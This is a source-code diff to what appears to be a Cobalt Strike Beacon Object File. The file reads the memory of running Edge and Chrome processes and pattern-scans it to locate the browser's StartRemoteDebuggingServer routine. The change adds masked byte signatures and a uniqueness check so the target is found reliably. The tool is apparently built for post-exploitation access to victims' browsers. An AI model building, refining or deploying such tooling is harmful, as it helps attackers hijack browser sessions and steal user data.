@@ -170,7 +170,25 @@ static const uint8_t EDGE_START_SIG[] = {
     0x55, 0x53, 0x48, 0x83, 0xEC, 0x50,
     0x44, 0x89, 0xCD, 0x4C, 0x89, 0xC3,
     0x48, 0x89, 0xD7, 0x48, 0x89, 0xCE,
-    0x48, 0x8B, 0x05, 0x5D
+    0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00,
+    0x48, 0x31, 0xE0, 0x48, 0x89, 0x44, 0x24, 0x48,
+    0xE8, 0x00, 0x00, 0x00, 0x00,
+    0x4C, 0x8B, 0x70, 0x08, 0x4D, 0x85, 0xF6, 0x0F, 0x84,
+    0x00, 0x00, 0x00, 0x00,
+    0xB9, 0x90, 0x00, 0x00, 0x00
+};
+
+static const uint8_t EDGE_START_MASK[] = {
+    1,1,1,1,1,1,1,1,
+    1,1,1,1,1,1,
+    1,1,1,1,1,1,
+    1,1,1,1,1,1,
+    1,1,1,0,0,0,0,
+    1,1,1,1,1,1,1,1,
+    1,0,0,0,0,
+    1,1,1,1,1,1,1,1,1,
+    0,0,0,0,
+    1,1,1,1,1
 };
 
 static const uint8_t CHROME_START_SIG[] = {
@@ -178,7 +196,12 @@ static const uint8_t CHROME_START_SIG[] = {
     0x48, 0x83, 0xEC, 0x48,
     0x44, 0x89, 0xCD, 0x4D, 0x89, 0xC6,
     0x48, 0x89, 0xD3, 0x48, 0x89, 0xCE,
-    0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00
+    0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00,
+    0x48, 0x31, 0xE0, 0x48, 0x89, 0x44, 0x24, 0x40, 0xE8,
+    0x00, 0x00, 0x00, 0x00,
+    0x4C, 0x8B, 0x78, 0x08, 0x4D, 0x85, 0xFF, 0x0F, 0x84,
+    0xE8, 0x00, 0x00, 0x00,
+    0xB9, 0x90, 0x00, 0x00, 0x00
 };
 
 static const uint8_t CHROME_START_MASK[] = {
@@ -186,7 +209,12 @@ static const uint8_t CHROME_START_MASK[] = {
     1,1,1,1,
     1,1,1,1,1,1,
     1,1,1,1,1,1,
-    1,1,1,0,0,0,0
+    1,1,1,0,0,0,0,
+    1,1,1,1,1,1,1,1,1,
+    0,0,0,0,
+    1,1,1,1,1,1,1,1,1,
+    1,1,1,1,
+    1,1,1,1,1
 };
 
 /* Short unique operator new signature. */
@@ -437,6 +465,50 @@ static void* ScanRemoteForSignature(HANDLE hProcess, uint8_t* start, SIZE_T size
     return NULL;
 }
 
+static int CountRemoteSignatureHits(HANDLE hProcess, uint8_t* start, SIZE_T size,
+                                    const uint8_t* sig, const uint8_t* mask, SIZE_T sig_len,
+                                    uintptr_t* first_hit) {
+    const SIZE_T chunk = 0x10000;
+    SIZE_T offset = 0;
+    int count = 0;
+    uint8_t* buf = (uint8_t*)HeapAlloc(GetProcessHeap(), 0, chunk + sig_len);
+    if (!buf) return 0;
+
+    if (first_hit) *first_hit = 0;
+
+    while (offset < size) {
+        SIZE_T to_read = size - offset;
+        SIZE_T read = 0, end, i;
+        if (to_read > chunk) to_read = chunk;
+
+        if (!ReadProcessMemory(hProcess, start + offset, buf, to_read, &read) || read < sig_len) {
+            offset += chunk;
+            continue;
+        }
+
+        end = read - sig_len;
+        for (i = 0; i <= end; i++) {
+            BOOL match = TRUE;
+            SIZE_T j;
+            for (j = 0; j < sig_len && match; j++) {
+                if (!mask || mask[j]) {
+                    if (buf[i + j] != sig[j]) match = FALSE;
+                }
+            }
+            if (match) {
+                if (count == 0 && first_hit) {
+                    *first_hit = (uintptr_t)(start + offset + i);
+                }
+                count++;
+            }
+        }
+        offset += chunk;
+    }
+
+    HeapFree(GetProcessHeap(), 0, buf);
+    return count;
+}
+
 static int ScanRemoteForAllSignatures(HANDLE hProcess, uint8_t* start, SIZE_T size,
                                       const uint8_t* sig, const uint8_t* mask, SIZE_T sig_len,
                                       uint64_t* out_matches, int max_matches) {
@@ -561,15 +633,21 @@ static BOOL ResolveSymbolsRuntime(HANDLE hProcess, uintptr_t module_base, const 
     void* entry1 = NULL;
     uint64_t destr_addrs[32];
     int destr_count = 0;
+    int start_hits = 0;
 
     if (!GetRemoteSectionInfo(hProcess, (uint8_t*)module_base, &text_base, &text_size, &rdata_base, &rdata_size)) {
         BeaconPrintf(CALLBACK_ERROR, "[-] Failed to read remote PE sections");
         return FALSE;
     }
 
-    *start_server = (uintptr_t)ScanRemoteForSignature(hProcess, text_base, text_size, target->start_sig, target->start_mask, target->start_sig_len);
-    if (!*start_server) {
+    start_hits = CountRemoteSignatureHits(
+        hProcess, text_base, text_size, target->start_sig, target->start_mask, target->start_sig_len, start_server);
+    if (start_hits == 0 || !*start_server) {
         BeaconPrintf(CALLBACK_ERROR, "[-] StartRemoteDebuggingServer signature not found");
+        return FALSE;
+    }
+    if (start_hits != 1) {
+        BeaconPrintf(CALLBACK_ERROR, "[-] StartRemoteDebuggingServer signature was not unique (hits=%d)", start_hits);
         return FALSE;
     }
 
@@ -602,7 +680,7 @@ static BOOL ResolveSymbolsRuntime(HANDLE hProcess, uintptr_t module_base, const 
 
 void go(char* args, int len) {
     TARGET_CFG targets[] = {
-        { "edge", L"msedge.exe", L"msedge.dll", EDGE_START_SIG, NULL, sizeof(EDGE_START_SIG), EDGE_ENTRY1_SIG, NULL, sizeof(EDGE_ENTRY1_SIG) },
+        { "edge", L"msedge.exe", L"msedge.dll", EDGE_START_SIG, EDGE_START_MASK, sizeof(EDGE_START_SIG), EDGE_ENTRY1_SIG, NULL, sizeof(EDGE_ENTRY1_SIG) },
         { "chrome", L"chrome.exe", L"chrome.dll", CHROME_START_SIG, CHROME_START_MASK, sizeof(CHROME_START_SIG), CHROME_ENTRY1_SIG, CHROME_ENTRY1_MASK, sizeof(CHROME_ENTRY1_SIG) }
     };
     datap parser;
